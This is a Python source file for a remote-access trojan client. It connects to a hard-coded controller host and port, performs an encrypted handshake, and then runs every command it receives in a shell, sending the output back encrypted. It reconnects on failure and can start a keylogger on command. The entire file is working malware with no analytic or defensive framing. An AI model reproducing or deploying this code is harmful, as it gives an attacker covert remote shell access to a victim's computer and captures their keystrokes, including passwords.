import socket, time, subprocess, threading,sys
import tools.keylogger as keylogger
import _thread as thread
import settings.keys as keys
import tools.cipher as cipher

global stop, thread_lock, command_list
command_list = []
thread_lock = thread.allocate_lock()
stop = False

def input_collection(sock,cipherClass):
    global command_list, thread_lock, stop
    while (not(stop)):
        try:
            command = sock.recv(2048)
            command = (cipherClass.decrypt(command)).decode()
            print(command)
            if command == 'keylogger':
                keylogger.keylogger('log.txt')
                sock.sendall('Keylogger active...'.encode())
            else:
                thread_lock.acquire()
                command_list.append(command)
                thread_lock.release()
        except socket.timeout:
            print("RECEIVED TIMED OUT..")
            pass
        except:
            stop = True
            return False

def execute_commands(sock,cipherClass):
    global command_list, thread_lock, stop
    while(not(stop)):
        try:
            time.sleep(1)
            command = None
            #Reads the command_list pipe, needs to obtain thread lock
            thread_lock.acquire()
            if (len(command_list) > 0):
                command = command_list.pop(0)
            thread_lock.release()
            if(command != None):
                response = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                data = response.stdout.read() + response.stderr.read()
                print("Response was: {}".format(data))
                sock.sendall(cipherClass.encrypt(data))
        except:
            print("ERROR IN EXECUTE_COMMANDS FUNCTION")
            stop = True
            return

def start_client(sock, key=keys.PASSWORD):
    global stop
    IV = None
    while(True):
        try:
            response = sock.recv(2048)
            if response[:3] == 'SRT'.encode():
                IV = response[3:]
                sock.send('ACK'.encode()+IV)
                break
        except socket.timeout:
            print("Socket timed out on handshake..")

    cipherClass = cipher.cipher(key=key,IV=IV,generatedIV=True)

    receiver = threading.Thread(target=input_collection,args=(sock,cipherClass))
    sender = threading.Thread(target=execute_commands,args=(sock,cipherClass))
    receiver.start()
    sender.start()

    receiver.join()
    sender.join()
    print("Error in one of the receiver or sender...")
    stop = False
    time.sleep(1)

HOST = '192.168.1.74'
PORT = 5001

while(True):
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((HOST,PORT))
        print("Connection successful...")
        start_client(sock)
    except:
        time.sleep(3)
        print("Connection Failed")
    finally:
        sock.close()